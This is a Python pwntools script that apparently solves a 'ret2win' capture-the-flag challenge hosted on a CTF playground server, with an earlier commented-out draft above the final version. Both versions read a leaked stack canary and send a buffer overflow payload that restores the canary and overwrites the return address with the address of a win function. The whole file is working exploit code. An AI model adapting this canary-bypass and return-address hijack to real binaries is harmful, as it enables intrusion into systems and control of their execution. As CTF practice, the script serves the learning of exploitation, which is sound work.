# from pwn import *
# elf = context.binary = ELF("./ret2win")
# p = process()
# #p = remote("playground.tcp1p.team",19002)
# canary_offset = 104
# rip_offset = 24
# # Receive the canary
# p.recvuntil(b"Here's a gift for you:")
# canary = int(p.recvline().strip().decode(), 16)
# log.info(f"Canary found: {hex(canary)}")
# # canary_ril = int(canary.decode(),16)
# print(f"Canary I grep: {hex(canary)}")
# rop = ROP(elf)
# ret = p64(rop.find_gadget(['ret'])[0])
# win = p64(elf.sym['win'])
# payload = b"A" * canary_offset + p64(canary) + b"B" * rip_offset + ret + win
# write("payload",payload)
# p.sendline(payload)
# print(p.recvall())

from pwn import *

# Connection details
host = "playground.tcp1p.team"
port = 19002

# Addresses and offsets
win = 0x000000000040123b  # Address of the 'win' function
buffer_size = 104         # Buffer size before canary

# Start a connection
conn = remote("playground.tcp1p.team",19002)

# Receive the gift (canary value)
conn.recvuntil(b"Here's a gift for you:")
canary_line = conn.recvline().strip()
canary = int(canary_line.decode(), 16)
log.info(f"Canary found: {hex(canary)}")

# Craft the payload
payload = b"A" * buffer_size     # Fill the buffer
payload += p64(canary)           # Append the canary
payload += b"B" * 8              # Overwrite saved RBP
payload += p64(win)              # Overwrite return address with 'win' function

# Send the payload
conn.recvuntil(b"Give me your payload:")
write("payload",payload)
conn.sendline(payload)

# Interact with the shell (if any)
conn.interactive()